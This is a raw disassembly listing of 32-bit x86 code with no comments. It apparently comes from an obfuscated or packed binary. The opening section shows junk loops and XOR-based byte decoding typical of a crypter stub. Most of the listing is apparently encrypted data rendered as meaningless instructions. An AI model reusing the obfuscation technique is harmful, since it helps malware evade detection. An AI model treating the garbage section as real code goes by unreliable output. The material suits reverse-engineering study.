  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
  4102f9:	sub    DWORD PTR ds:0x433767,0x43371f
  410303:	xor    al,0x46
  410305:	xor    DWORD PTR ds:0x433763,0x433717
  41030f:	sub    al,0x38
  410311:	mov    BYTE PTR [ecx],al
  410313:	movzx  ecx,WORD PTR ds:0x4336d7
  41031a:	sub    DWORD PTR ds:0x43369f,ecx
  410320:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  410327:	mov    DWORD PTR [ebp-0x10],0xf89c8532
  41032e:	and    DWORD PTR ds:0x4336db,0x0
  410338:	mov    ecx,DWORD PTR ds:0x4336db
  41033e:	inc    ecx
  41033f:	mov    DWORD PTR ds:0x4336db,ecx
  410345:	cmp    DWORD PTR ds:0x4336db,0x25
  41034c:	jne    0x410362
  410352:	push   0x43382f
  410357:	push   0x43386f
  41035c:	call   DWORD PTR ds:0x4120f4
  410362:	cmp    DWORD PTR ds:0x4336db,0x16
  410369:	jb     0x410338
  41036f:	adc    DWORD PTR ds:0x43371f,edx
  410375:	mov    eax,DWORD PTR [ebp-0x8]
  410378:	and    DWORD PTR ds:0x433793,0x0
  410382:	mov    ecx,DWORD PTR ds:0x433793
  410388:	inc    ecx
  410389:	mov    DWORD PTR ds:0x433793,ecx
  41038f:	cmp    DWORD PTR ds:0x433793,0xf
  410396:	jne    0x4103ac
  41039c:	push   0x433767
  4103a1:	push   0x178b
  4103a6:	call   DWORD PTR ds:0x412378
  4103ac:	cmp    DWORD PTR ds:0x433793,0xe
  4103b3:	jne    0x4103c8
  4103b9:	xor    ecx,ecx
  4103bb:	xor    ecx,DWORD PTR ds:0x433793
  4103c1:	inc    ecx
  4103c2:	mov    DWORD PTR ds:0x433793,ecx
  4103c8:	cmp    DWORD PTR ds:0x433793,0x1b
  4103cf:	jb     0x410382
  4103d5:	sub    DWORD PTR ds:0x4336df,edx
  4103db:	mov    ecx,0x7510854
  4103e0:	push   esi
  4103e1:	and    DWORD PTR ds:0x4336d7,0x0
  4103eb:	jmp    0x4103ff
  4103f0:	xor    esi,esi
  4103f2:	add    esi,DWORD PTR ds:0x4336d7
  4103f8:	inc    esi
  4103f9:	mov    DWORD PTR ds:0x4336d7,esi
  4103ff:	cmp    DWORD PTR ds:0x4336d7,0x1d
  410406:	jae    0x410427
  41040c:	cmp    DWORD PTR ds:0x4336d7,0x26
  410413:	jne    0x410422
  410419:	push   DWORD PTR [ebp-0x24]
  41041c:	call   DWORD PTR ds:0x4122b4
  410422:	jmp    0x4103f0
  410427:	xor    eax,ecx
  410429:	mov    esi,0x32729b
  41042e:	add    eax,esi
  410430:	jmp    0x41043d
  410435:	mov    dl,BYTE PTR [ebp-0x1]
  410438:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  41043c:	inc    eax
  41043d:	cmp    eax,0x40
  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x35,al
  41049c:	stos   BYTE PTR es:[edi],al
  41049d:	inc    edi
  41049e:	into   
  41049f:	fdiv   QWORD PTR [eax+0x7caf7e7e]
  4104a5:	jle    0x410525
  4104a7:	jno    0x410467
  4104a9:	push   ss
  4104aa:	push   esi
  4104ab:	mov    esp,0x8ce284f0
  4104b0:	xor    al,0x17
  4104b2:	(bad)  
  4104b4:	leavew 
  4104b6:	loope  0x410498
  4104b8:	int    0xd4
  4104ba:	mov    dl,0x59
  4104bc:	xor    eax,DWORD PTR [eax-0x2ad7ec0]
  4104c2:	in     al,dx
  4104c3:	es ret 
  4104c5:	and    DWORD PTR [edx+0x6ba282fe],edi
  4104cb:	retf   0x751
  4104ce:	or     bh,BYTE PTR [esi+0x41]
  4104d1:	inc    edi
  4104d2:	int    0x6a
  4104d4:	dec    edi
  4104d5:	pop    edi
  4104d6:	and    dh,al
  4104d8:	xor    eax,0xf533e54d
  4104dd:	or     al,0x5e
  4104df:	ss xchg esp,eax
  4104e1:	shr    BYTE PTR [edx+0x72],1
  4104e4:	mov    cl,0xf5
  4104e6:	retf   
  4104e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4104e8:	inc    cx
  4104ea:	adc    ax,0x924f
  4104ee:	adc    BYTE PTR [edi+0x1a20eb51],0xb5
  4104f5:	ds and eax,0x71293f10
  4104fb:	push   edi
  4104fc:	call   0x6280:0x92d5fa96
  410503:	int3   
  410504:	hlt    
  410505:	neg    BYTE PTR [ebp-0x1b4f5b3a]
  41050b:	call   0xd39e6c72
  410510:	add    bh,BYTE PTR [esi+0x6b]
  410513:	int3   
  410514:	(bad)  [ebp-0x155655ea]
  41051a:	or     esi,0x1a
  41051d:	js     0x4104c6
  41051f:	mov    ch,0x1b
  410521:	pop    ebp
  410522:	pop    ebx
  410523:	xchg   edx,eax
  410524:	iret   
  410525:	mov    WORD PTR [ebp+0x21],fs
  410528:	fst    QWORD PTR [ebp-0x75]
  41052b:	push   0x77
  41052d:	sti    
  41052e:	mov    al,0x67
  410530:	iret   
  410531:	int    0xdd
  410533:	adc    al,0xcf
  410535:	je     0x410538
  410537:	int    0x6d
  410539:	sbb    ebx,DWORD PTR [ebx-0x5f]
  41053c:	ret    0xfce7
  41053f:	jmp    0x5c88:0x1b87d3ec
  410546:	inc    ebx
  410547:	sti    
  410548:	fsubr  QWORD PTR [ebx+edi*1+0x66]
  41054c:	ja     0x410570
  41054e:	and    ebx,DWORD PTR [eax]
  410550:	out    dx,eax
  410551:	(bad)  [esi+0x7e]
  410554:	outs   dx,DWORD PTR ds:[esi]
  410555:	pop    ecx
  410556:	or     BYTE PTR [edi+0x20],dh
  410559:	cli    
  41055a:	mov    ebp,DWORD PTR [esi-0x2aec2eb6]
  410560:	nop
  410561:	pop    eax
  410562:	fld    DWORD PTR es:[edx+0x559ff494]
  410569:	sbb    DWORD PTR [edx+ebx*8],edx
  41056c:	mov    esi,0x99f9cc75
  410571:	add    eax,0xc6a64548
  410576:	retf   
  410577:	test   eax,0xa1f6f479
  41057c:	outs   dx,BYTE PTR ds:[esi]
  41057d:	test   BYTE PTR [ecx+0x653f381e],bl
  410583:	jg     0x410548
  410585:	out    0xd8,eax
  410587:	icebp  
  410588:	retf   
  410589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41058a:	outs   dx,BYTE PTR ds:[esi]
  41058b:	jmp    0x8a62b4dc
  410590:	inc    esi
  410591:	repnz not BYTE PTR [edx]
  410594:	sbb    edx,DWORD PTR [eax]
  410596:	test   al,0x68
  410598:	cmp    BYTE PTR [edx+0x56ca369],dh
  41059e:	out    dx,eax
  41059f:	mov    esp,edi
  4105a1:	fnstenv [eax-0x4812c1f4]
  4105a7:	(bad)  
  4105a8:	(bad)
  4105ac:	sbb    cl,BYTE PTR [ebx-0xa]
  4105af:	fcmovbe st,st(6)
  4105b1:	push   0x7e
  4105b3:	push   ecx
  4105b4:	inc    edx
  4105b5:	aaa    
  4105b6:	add    BYTE PTR ds:0xa8f0329b,dl
  4105bd:	xor    al,0x1a
  4105bf:	xchg   edi,eax
  4105c0:	adc    cl,BYTE PTR [edi]
  4105c2:	push   0xffffffc3
  4105c4:	aaa    
  4105c5:	popa   
  4105c6:	std    
  4105c7:	es pop ebx
  4105c9:	mov    dl,0xce
  4105cb:	jmp    0x4105fc
  4105cd:	sbb    esi,esi
  4105cf:	nop
  4105d0:	and    DWORD PTR [esi],eax
  4105d2:	or     DWORD PTR [ebp+0x5ad6073e],ebx
  4105d8:	push   ebx
  4105d9:	mov    ch,BYTE PTR [ecx]
  4105db:	lahf   
  4105dc:	daa    
  4105dd:	and    DWORD PTR [edx],ebx
  4105df:	clc    
  4105e0:	or     eax,0x8cc83a62
  4105e5:	push   0x2657a5f3
  4105ea:	test   eax,0x8ba25f24
  4105ef:	daa    
  4105f0:	mov    bl,0xc1
  4105f2:	xchg   ah,dh
  4105f4:	(bad)  
  4105f5:	loop   0x4105a0
  4105f7:	jb     0x41062e
  4105f9:	push   ecx
  4105fa:	fisttp DWORD PTR [eax]
  4105fc:	jae    0x410598
  4105fe:	call   0x54aba6dd
  410603:	cmp    ecx,DWORD PTR [eax]
  410605:	rcr    cl,0xc0
  410608:	shr    DWORD PTR [ebx-0x6e],1
  41060b:	js     0x41063f
  41060d:	jnp    0x4105fa
  41060f:	jge    0x410631
  410611:	enter  0x2fb8,0x47
  410615:	mov    ecx,0x27f9606f
  41061a:	ins    DWORD PTR es:[edi],dx
  41061b:	pop    esp
  41061c:	enter  0x6e7b,0xcc
  410620:	mov    eax,0x4a1563dd
  410625:	ins    DWORD PTR es:[edi],dx
  410626:	not    DWORD PTR ds:0xffe2dc91
  41062c:	popa   
  41062d:	test   al,0x1f
  41062f:	jmp    0x87842b8c
  410634:	and    ebx,ebp
  410636:	xchg   ecx,eax
  410637:	mov    edi,0x453f3af9
  41063c:	add    eax,0xccca59ed
  410641:	push   edx
  410642:	fsub   DWORD PTR [ebx+0x538396f0]
  410648:	mov    dl,0x59
  41064a:	test   eax,0x4e3c33d8
  41064f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410650:	add    ecx,eax
  410652:	(bad)  
  410653:	fisubr WORD PTR [ebx-0x5a]
  410656:	lahf   
  410657:	hlt    
  410658:	leave  
  410659:	and    DWORD PTR [ebp+0x7b],edx
  41065c:	ds push edx
  41065e:	imul   ecx,DWORD PTR [edx+0x208c0ea1],0xd623ff73
  410668:	outs   dx,DWORD PTR ds:[esi]
  410669:	iret   
  41066a:	lods   eax,DWORD PTR ds:[esi]
  41066b:	movd   edx,mm1
  41066e:	ja     0x41060b
  410670:	shl    DWORD PTR [ebp-0x6213bc9a],cl
  410676:	fcmovbe st,st(3)
  410678:	cmp    BYTE PTR [ebp-0x1a7b8ac7],cl
  41067e:	out    dx,al
  41067f:	sahf   
  410680:	jp     0x4106cc
  410682:	mov    DWORD PTR [edx+0x60c314c0],ebp
  410688:	stos   BYTE PTR es:[edi],al
  410689:	ss in  eax,dx
  41068b:	scas   eax,DWORD PTR es:[edi]
  41068c:	nop
  41068d:	sbb    eax,0x94883a91
  410692:	sbb    al,0x95
  410694:	push   0x6d
  410696:	jmp    0x335030e7
  41069b:	adc    al,0x65
  41069d:	jnp    0x410674
  41069f:	popf   
  4106a0:	cwde   
  4106a1:	popf   
  4106a2:	das    
  4106a3:	sbb    dl,BYTE PTR [esi+0x3e]
  4106a6:	hlt    
  4106a7:	mov    eax,0xe11e8055
  4106ac:	out    0x5b,al
  4106ae:	mov    dl,0x4d
  4106b0:	mov    esi,DWORD PTR [ecx-0x1b]
  4106b3:	or     DWORD PTR [edi],ecx
  4106b5:	push   ebx
  4106b6:	adc    al,0x43
  4106b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4106b9:	sbb    eax,0x54cf0238
  4106be:	and    ah,BYTE PTR [ecx-0x2aa88a65]
  4106c4:	mov    esp,0xe3972fb4
  4106c9:	cld    
  4106ca:	jmp    0x4b9ffad0
  4106cf:	out    dx,al
  4106d0:	fadd   st,st(0)
  4106d2:	adc    al,BYTE PTR [ebx]
  4106d4:	jmp    0x9afcce74
  4106d9:	arpl   WORD PTR [eax+0x5bd7abdf],dx
  4106df:	ds or  eax,0x6e673337
  4106e5:	pop    ecx
  4106e6:	mov    ch,0x4
  4106e8:	or     DWORD PTR [edi+0x7c],edx
  4106eb:	fst    st(4)
  4106ed:	push   esp
  4106ee:	out    0xd6,al
  4106f0:	jmp    0x298:0x93a5fea1
  4106f7:	add    DWORD PTR [edi-0x50d077d4],eax
  4106fd:	pop    ds
  4106fe:	std    
  4106ff:	lds    eax,FWORD PTR [edi+0x38]
  410702:	repnz imul esp,DWORD PTR [ebp+0x3b],0xc9727700
  41070a:	push   edx
  41070b:	xor    BYTE PTR [esi-0xc],0x3a
  41070f:	xchg   ebp,eax
  410710:	cwde   
  410711:	pop    ebx
  410712:	xchg   ebp,eax
  410713:	mov    ebp,0x98dc0ce5
  410718:	mov    dl,0x98
  41071a:	cli    
  41071b:	add    bh,dl
  41071d:	mov    al,BYTE PTR [ebx+0x526c0d23]
  410723:	push   edi
  410724:	inc    edx
  410725:	in     eax,0x16
  410727:	and    bl,dl
  410729:	shl    DWORD PTR [eax+0x3f6e156d],cl
  41072f:	mov    dl,0xfc
  410731:	push   eax
  410732:	sbb    BYTE PTR [ecx],bl
  410734:	ret    0xbfc4
  410737:	lahf   
  410738:	outs   dx,DWORD PTR ds:[esi]
  410739:	sbb    DWORD PTR [eax-0x18a7522c],ebp
  41073f:	xor    DWORD PTR ds:0x2755c75e,edi
  410745:	and    ebx,ebp
  410747:	xchg   edx,eax
  410748:	dec    edi
  410749:	lds    bp,DWORD PTR [ebp+eax*1+0x4e404b09]
  410751:	je     0x410747
  410753:	fnsave [edi+ebp*1+0x458b5b52]
  41075a:	hlt    
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x8ab7a9b6
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410770
  41078c:	sbb    BYTE PTR [edi+0x6c],cl
  41078f:	inc    edx
  410790:	adc    al,BYTE PTR [ebp+0x14603c10]
  410796:	repz mov WORD PTR [ebp+0x63f4eff6],gs
  41079d:	int3   
  41079e:	out    0x9b,eax
  4107a0:	push   cs
  4107a1:	ds daa 
  4107a3:	sub    ecx,0xffffffef
  4107a6:	pop    esi
  4107a7:	jle    0x4107fc
  4107a9:	pop    ss
  4107aa:	cmc    
  4107ab:	xor    eax,0x3c737c17
  4107b0:	sar    BYTE PTR ds:0x307f7eab,0x10
  4107b7:	jp     0x410803
  4107b9:	xor    ebp,DWORD PTR [esi+0xa16900a]
  4107bf:	sbb    esi,DWORD PTR [ebp+0x27cd1b81]
  4107c5:	test   al,0xae
  4107c7:	je     0x4107e4
  4107c9:	xchg   esp,eax
  4107ca:	lea    edi,[edx+eax*8+0x44]
  4107ce:	int    0x9e
  4107d0:	xchg   edx,eax
  4107d1:	fsub   DWORD PTR [ebp-0x68fa828]
  4107d7:	ss and bh,bl
  4107da:	push   esi
  4107db:	push   esi
  4107dc:	mov    ah,0x29
  4107de:	add    edx,ebx
  4107e0:	fstp   DWORD PTR [edi+0x35]
  4107e3:	out    dx,eax
  4107e4:	adc    esi,DWORD PTR [ecx]
  4107e6:	mov    DWORD PTR [ebp+0x78],esi
  4107e9:	aas    
  4107ea:	pop    ecx
  4107eb:	jnp    0x410819
  4107ed:	out    dx,eax
  4107ee:	cmp    edi,DWORD PTR [ecx-0x52]
  4107f1:	aad    0xdf
  4107f3:	enter  0xffb9,0xbf
  4107f7:	retf   0x3fb
  4107fa:	or     bh,BYTE PTR [edi]
  4107fc:	jle    0x410836
  4107fe:	mov    cl,0xe8
  410800:	scas   al,BYTE PTR es:[edi]
  410801:	cwde   
  410802:	ret    
  410803:	push   edx
  410804:	sbb    edx,eax
  410806:	inc    esi
  410807:	(bad)  
  410808:	jle    0x41082b
  41080a:	imul   ebx,edi,0xffffffe1
  41080d:	xchg   edx,eax
  41080e:	xchg   ecx,eax
  41080f:	adc    DWORD PTR [ebp-0x34cbe8c],esi
  410815:	ficomp DWORD PTR [edx+ecx*4-0x5fe7d375]
  41081c:	aam    0x29
  41081e:	stc    
  41081f:	jns    0x410884
  410821:	ja     0x41083f
  410823:	adc    dh,dl
  410825:	jl     0x41087d
  410827:	sti    
  410828:	shl    DWORD PTR [esi-0x7820b02c],cl
  41082e:	mov    eax,ds:0x4dec16c8
  410833:	aam    0xd9
  410835:	test   eax,esi
  410837:	inc    edi
  410838:	xlat   BYTE PTR ds:[ebx]
  410839:	aam    0x94
  41083b:	mov    DWORD PTR [edx],ecx
  41083d:	rcr    ebp,1
  41083f:	aas    
  410840:	adc    bh,dh
  410842:	pop    esp
  410843:	popa   
  410844:	repz sbb BYTE PTR [edx+0x4b],bl
  410848:	jae    0x4107f1
  41084a:	outs   dx,DWORD PTR ds:[esi]
  41084b:	out    dx,eax
  41084c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41084d:	mov    ecx,0x1e5faf40
  410852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410853:	cmp    eax,0x53f4e708
  410858:	push   0x46dc6fb0
  41085d:	mov    ah,0x6
  41085f:	cmp    bh,ch
  410861:	enter  0xe04c,0x0
  410865:	jg     0x41088b
  410867:	(bad)  
  410868:	xchg   esi,eax
  410869:	jns    0x4108e0
  41086b:	mov    BYTE PTR [ecx],al
  41086d:	push   edi
  41086e:	sub    DWORD PTR [ecx+0x62],0xa0058e53
  410875:	fldenv [esi-0x392ad3e9]
  41087b:	mov    WORD PTR [esi+0x214bea82],ss
  410881:	ja     0x410822
  410883:	daa    
  410884:	fimul  WORD PTR [ebp-0x5125feb0]
  41088a:	stos   DWORD PTR es:[edi],eax
  41088b:	imul   edi,DWORD PTR [edi+0x2bd71717],0xf08d9c4c
  410895:	sub    DWORD PTR [ebp+0x22e256df],ebx
  41089b:	jmp    0x410911
  41089d:	test   al,0x44
  41089f:	lods   eax,DWORD PTR ds:[esi]
  4108a0:	sbb    DWORD PTR [ebx+ebx*8-0x1b],0x23
  4108a5:	jae    0x410852
  4108a7:	sbb    DWORD PTR [eax-0xe],0xffffffb0
  4108ab:	xor    BYTE PTR [esi-0x38],al
  4108ae:	sub    al,0xda
  4108b0:	cmp    DWORD PTR [ebp+ebx*8+0x7d],edx
  4108b4:	rcl    BYTE PTR [edx],0xed
  4108b7:	test   DWORD PTR [edx-0x53ab8e80],esp
  4108bd:	sub    eax,0xc24b0261
  4108c2:	sub    DWORD PTR [ecx-0x2a46422f],edi
  4108c8:	lds    ebp,FWORD PTR [edi+0x17b0015f]
  4108ce:	cli    
  4108cf:	js     0x41091b
  4108d1:	cmc    
  4108d2:	cmp    al,0xfc
  4108d4:	inc    edx
  4108d5:	imul   edi,DWORD PTR [ebp+0x6686b00],0xffffffcd
  4108dc:	enter  0x2379,0xf6
  4108e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108e1:	aam    0x1a
  4108e3:	add    eax,0xd37d0d53
  4108e8:	gs add edi,ebx
  4108eb:	ficomp DWORD PTR [edi]
  4108ed:	aad    0xc5
  4108ef:	aaa    
  4108f0:	cmp    bh,dl
  4108f2:	mov    ah,0xc6
  4108f4:	sub    DWORD PTR [esi-0xf],ebx
  4108f7:	std    
  4108f8:	sbb    ch,BYTE PTR [ebx]
  4108fa:	sub    al,0xeb
  4108fc:	inc    DWORD PTR [ecx]
  4108fe:	adc    bl,al
  410900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410901:	mov    ah,0x4e
  410903:	xchg   ebp,eax
  410904:	dec    ecx
  410905:	mov    al,0xf3
  410907:	lods   eax,DWORD PTR ds:[esi]
  410908:	idiv   BYTE PTR ds:0xb5d5b7de
  41090e:	cs pop es
  410910:	jge    0x410954
  410912:	pop    ds
  410913:	jbe    0x410957
  410915:	push   0xe6526a35
  41091a:	sbb    esp,edx
  41091c:	sub    edi,DWORD PTR [ebx+ecx*1]
  41091f:	push   ss
  410920:	xchg   edi,eax
  410921:	rcr    DWORD PTR [edx-0x2c5fefb6],0x5e
  410928:	sub    al,0xde
  41092a:	mul    DWORD PTR [esi]
  41092c:	cld    
  41092d:	jmp    0x6434:0xeaa1a4f5
  410934:	or     BYTE PTR [esp+edi*2],0xa8
  410938:	cmp    eax,0xef79e7d0
  41093d:	push   esp
  41093e:	xchg   ebp,eax
  41093f:	xor    esi,DWORD PTR [ebp+eax*8+0x5fe5370c]
  410946:	ja     0x410934
  410948:	cmp    DWORD PTR [ebp+0x25],edi
  41094b:	xchg   BYTE PTR [edx+0x5f7aa51d],cl
  410951:	leave  
  410952:	pushf  
  410953:	aad    0x52
  410955:	repz (bad) 
  410958:	add    cl,dh
  41095a:	call   FWORD PTR [ebx-0x7f14e3c8]
  410960:	test   DWORD PTR [eax+0x35f1336c],edi
  410966:	pushf  
  410967:	xor    DWORD PTR [esp+edi*1],esi
  41096a:	mov    edx,0xd150b27
  41096f:	adc    bl,BYTE PTR [eax-0x15807e3f]
  410975:	arpl   WORD PTR [eax-0x5c2a429a],sp
  41097b:	mov    WORD PTR ds:0xc2e7274f,es
  410981:	in     al,0x7c
  410983:	scas   eax,DWORD PTR es:[edi]
  410984:	cld    
  410985:	sub    esp,DWORD PTR [ebx+0x5eecb619]
  41098b:	sbb    ah,bh
  41098d:	dec    ebx
  41098e:	test   eax,0xbcb2f28
  410993:	adc    dh,bh
  410995:	mov    edi,0xb79415e6
  41099a:	mov    cl,0xd8
  41099c:	test   al,0xea
  41099e:	xor    ecx,DWORD PTR [ebx]
  4109a0:	push   edx
  4109a1:	dec    esp
  4109a2:	loope  0x4109ca
  4109a4:	xor    al,BYTE PTR [eax*1+0x22ce1359]
  4109ab:	pop    ebx
  4109ac:	fs mov cl,0x4a
  4109af:	es jo  0x4109c5
  4109b2:	mov    es,WORD PTR [edi+0x69]
  4109b5:	mov    bh,0x9
  4109b7:	stos   DWORD PTR es:[edi],eax
  4109b8:	mov    dl,0x3e
  4109ba:	scas   al,BYTE PTR es:[edi]
  4109bb:	sub    BYTE PTR [edx+esi*8-0x1589f9a],0x6a
  4109c3:	ret    
  4109c4:	dec    edx
  4109c5:	xor    DWORD PTR es:[ecx+edi*1],edx
  4109c9:	inc    edi
  4109ca:	imul   esi,DWORD PTR [esi],0xef28cb87
  4109d0:	popf   
  4109d1:	shr    cl,0x4d
  4109d4:	add    al,0xee
  4109d6:	push   ebx
  4109d7:	addr16 jmp 0x666b5cd7
  4109dd:	jge    0x41098d
  4109df:	(bad)  
  4109e0:	ins    DWORD PTR es:[edi],dx
  4109e1:	mov    bh,0x94
  4109e3:	sub    eax,0xdfc96308
  4109e8:	int    0xae
  4109ea:	fst    DWORD PTR [edx]
  4109ec:	mov    cl,0x3d
  4109ee:	imul   edx,ecx,0xffffff92
  4109f1:	mov    ds:0x2b713e27,al
  4109f6:	or     ebp,esi
  4109f8:	cwde   
  4109f9:	mov    edi,0xb0bde869
  4109fe:	(bad)  
  4109ff:	ret    0x6d63
  410a02:	rcr    BYTE PTR [ebp+0x5fdc322a],0x74
  410a09:	cwde   
  410a0a:	mov    al,ds:0x3be86497
  410a0f:	xchg   ecx,eax
  410a10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410a11:	mov    ds:0x8bcb07fc,al
  410a16:	retf   0x12a7
  410a19:	sbb    BYTE PTR [eax+0x3d3c4636],bh
  410a1f:	jno    0x4109c2
  410a21:	xlat   BYTE PTR ds:[ebx]
  410a22:	enter  0x4c52,0x7
  410a26:	and    DWORD PTR [ebx+0x53],edi
  410a29:	and    BYTE PTR ds:0xc6c60653,ah
  410a2f:	daa    
  410a30:	xchg   esp,eax
  410a31:	adc    BYTE PTR [ebx+ebx*2+0x2a782aa3],ch
  410a38:	call   0x3e90f62
  410a3d:	(bad)  
  410a3e:	jmp    0x410d0c
  410a43:	add    dh,BYTE PTR [edx]
  410a45:	fdiv   QWORD PTR fs:[eax+ebp*2-0x7e]
  410a4a:	lock pop eax
  410a4c:	(bad)  
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	arpl   cx,si
  410a51:	sti    
  410a52:	push   0x7e7ebdba
  410a57:	scas   eax,DWORD PTR es:[edi]
  410a58:	jl     0x410ad8
  410a5a:	jle    0x4109f0
  410a5c:	push   es
  410a5d:	leave  
  410a5e:	imul   ecx,DWORD PTR [ebp+0x4e],0x5d
  410a62:	dec    esp
  410a63:	xchg   edi,eax
  410a64:	push   es
  410a65:	pop    ecx
  410a66:	fnstsw WORD PTR [edx-0x41a4834b]
  410a6c:	fld    DWORD PTR [eax]
  410a6e:	push   ds
  410a6f:	pop    edi
  410a70:	ja     0x410ae8
  410a72:	and    BYTE PTR [ebp+0x69222c26],dh
  410a78:	inc    ecx
  410a79:	pop    es
  410a7a:	push   ss
  410a7b:	enter  0xcc42,0x28
  410a7f:	mov    eax,ds:0x1b5a6a6f
  410a84:	pop    ss
  410a85:	jge    0x410a3e
  410a87:	adc    BYTE PTR [eax-0x50],bh
  410a8a:	add    cl,al
  410a8c:	ror    BYTE PTR ds:0x8dcad012,cl
  410a92:	xor    eax,0xf2d9659a
  410a97:	adc    edx,DWORD PTR [esi]
  410a99:	mov    bl,0x67
  410a9b:	inc    ebp
  410a9c:	and    ch,BYTE PTR [ecx+eiz*4+0x2b]
  410aa0:	pop    esi
  410aa1:	dec    ebp
  410aa2:	dec    edx
  410aa3:	dec    esi
  410aa4:	push   ebx
  410aa5:	or     edi,DWORD PTR [eax+esi*2-0x52c7c55a]
  410aac:	mov    esi,0xe9ec11ec
  410ab1:	in     al,dx
  410ab2:	xor    al,0x76
  410ab4:	les    ebp,FWORD PTR [esi+0x56]
  410ab7:	shr    BYTE PTR ds:0xf89dd2cc,cl
  410abd:	mov    ds:0xb39c50c6,al
  410ac2:	sbb    al,0x34
  410ac4:	fild   DWORD PTR [eax-0x30]
  410ac7:	or     DWORD PTR [ebx+0x4b7746ff],ebp
  410acd:	cmp    ebx,DWORD PTR [ecx-0x5b]
  410ad0:	inc    ebp
  410ad1:	sbb    BYTE PTR [ebx],cl
  410ad3:	inc    esp
  410ad4:	jnp    0x410a78
  410ad6:	clc    
  410ad7:	shr    dl,1
  410ad9:	mov    edx,DWORD PTR [ebx]
  410adb:	mov    ebp,0x58e94f10
  410ae0:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410ae2:	lds    eax,FWORD PTR [ecx+0x3d]
  410ae5:	nop
  410ae6:	jbe    0x410a69
  410ae8:	mov    bh,0xed
  410aea:	mov    edx,0x8cf5e46f
  410aef:	and    esi,DWORD PTR [ebx]
  410af1:	sub    ah,BYTE PTR [ebx]
  410af3:	int3   
  410af4:	sbb    dh,bh
  410af6:	or     DWORD PTR [edx-0x5d],0xfffffffd
  410afa:	inc    ebp
  410afb:	jae    0x410b0f
  410afd:	mov    ds:0x5f63a861,eax
  410b02:	mov    ecx,0x435a2584
  410b07:	pop    ebp
  410b08:	aam    0xcf
  410b0a:	xor    esi,DWORD PTR [ebx+0x36ed412f]
  410b10:	rol    BYTE PTR ds:0xc8c2ebb0,0x81
  410b17:	dec    ecx
  410b18:	fdivr  QWORD PTR [ecx+edi*4+0x5510ef16]
  410b1f:	test   DWORD PTR [ecx],edx
  410b21:	dec    esi
  410b22:	add    ch,cl
  410b24:	mov    al,ds:0x53340e24
  410b29:	inc    ebx
  410b2a:	aam    0x61
  410b2c:	in     eax,dx
  410b2d:	outs   dx,DWORD PTR ds:[esi]
  410b2e:	sbb    ah,BYTE PTR [eax+0x5e]
  410b31:	aas    
  410b32:	adc    BYTE PTR [ecx-0x71],0xc9
  410b36:	fisubr DWORD PTR [edx+eax*8+0x7e9a144a]
  410b3d:	inc    esi
  410b3e:	mov    fs,WORD PTR [ebp-0x20]
  410b41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b42:	aam    0x51
  410b44:	sbb    BYTE PTR [ebp-0x11],dl
  410b47:	dec    edi
  410b48:	push   edx
  410b49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4a:	pop    ecx
  410b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4c:	pushf  
  410b4d:	cmc    
  410b4e:	mov    dl,0x97
  410b50:	jno    0x410ae1
  410b52:	add    eax,0x337ff0ff
  410b57:	add    eax,0x80fe42de
  410b5c:	cmc    
  410b5d:	fmul   st(4),st
  410b5f:	not    BYTE PTR [ebp+0x6f]
  410b62:	mov    edx,0xfd525f94
  410b67:	push   edx
  410b68:	aaa    
  410b69:	icebp  
  410b6a:	push   ebx
  410b6b:	xor    BYTE PTR [ecx],0xd2
  410b6e:	nop
  410b6f:	sub    BYTE PTR [edx],dl
  410b71:	push   0xffffffa3
  410b73:	fisttp QWORD PTR [ebx]
  410b75:	push   eax
  410b76:	mov    eax,0x75382bea
  410b7b:	xor    DWORD PTR [eax+ecx*2],ebp
  410b7e:	sbb    DWORD PTR [esi],esi
  410b80:	dec    eax
  410b81:	xchg   ecx,eax
  410b82:	ins    DWORD PTR es:[edi],dx
